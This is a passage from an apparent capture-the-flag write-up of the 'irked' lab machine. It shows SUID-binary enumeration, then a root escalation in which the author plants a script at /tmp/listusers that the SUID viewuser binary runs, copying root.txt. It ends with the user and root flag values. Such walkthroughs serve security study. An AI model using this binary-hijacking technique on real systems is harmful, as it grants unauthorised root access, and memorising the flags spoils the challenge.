-rwsr-sr-x 1 root root 9.3K Apr  1  2014 /usr/bin/X
-rwsr-xr-x 1 root root 52K May 17  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 52K May 17  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 7.2K May 16  2018 /usr/bin/viewuser (Unknown SUID binary)
-rwsr-xr-x 1 root root 95K Aug 13  2014 /sbin/mount.nfs
-rwsr-xr-x 1 root root 38K May 17  2017 /bin/su
-rwsr-xr-x 1 root root 34K Mar 29  2015 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 34K Jan 21  2016 /bin/fusermount
-rwsr-xr-x 1 root root 158K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
-rwsr-xr-x 1 root root 26K Mar 29  2015 /bin/umount  --->  BSD/Linux(08-1996)
```

a lot of the usual suspects here, but `exim4` and `procmail` look interesting.

additionally,
```
-rwsr-xr-x 1 root root 14K Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper (Unknown SUID binary)
-rwsr-xr-x 1 root root 7.2K May 16  2018 /usr/bin/viewuser (Unknown SUID binary)
```

```
djmardov@irked:~$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2022-07-26 11:27 (:0)
djmardov pts/0        2022-07-26 11:28 (10.10.14.9)
sh: 1: /tmp/listusers: not found
```

interesting, we can definitely control `/tmp/listusers` and.. it looks like they are blindly executing it

```
djmardov@irked:~$ chmod +x /tmp/listusers
djmardov@irked:~$ cat /tmp/listusers
#!/bin/sh
cp /root/root.txt /tmp/
chmod 0644 /tmp/root.txt
djmardov@irked:~$ ls -l /tmp
total 20
-rwxr-xr-x 1 djmardov djmardov   59 Jul 26 17:51 listusers
drwx------ 3 root     root     4096 Jul 26 11:27 systemd-private-3d6e771b211647a7a79d0b0973174941-colord.service-dUjBdK
drwx------ 3 root     root     4096 Jul 26 11:32 systemd-private-3d6e771b211647a7a79d0b0973174941-cups.service-ZtOxF7
drwx------ 3 root     root     4096 Jul 26 11:27 systemd-private-3d6e771b211647a7a79d0b0973174941-rtkit-daemon.service-dH9DZO
drwx------ 2 root     root     4096 Jul 26 11:27 vmware-root
djmardov@irked:~$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2022-07-26 11:27 (:0)
djmardov pts/0        2022-07-26 11:28 (10.10.14.9)
djmardov@irked:~$ ls -l /tmp
total 24
-rwxr-xr-x 1 djmardov djmardov   59 Jul 26 17:51 listusers
-rw------- 1 root     djmardov   33 Jul 26 17:51 root.txt
drwx------ 3 root     root     4096 Jul 26 11:27 systemd-private-3d6e771b211647a7a79d0b0973174941-colord.service-dUjBdK
drwx------ 3 root     root     4096 Jul 26 11:32 systemd-private-3d6e771b211647a7a79d0b0973174941-cups.service-ZtOxF7
drwx------ 3 root     root     4096 Jul 26 11:27 systemd-private-3d6e771b211647a7a79d0b0973174941-rtkit-daemon.service-dH9DZO
drwx------ 2 root     root     4096 Jul 26 11:27 vmware-root
djmardov@irked:~$ cat /tmp/root.txt
8d8e9e8be64654b6dccc3bff4522daf3
```

awwwww yeah.

## flag
```
user:4a66a78b12dc0e661a59d3f5c0267a8e
root:8d8e9e8be64654b6dccc3bff4522daf3
```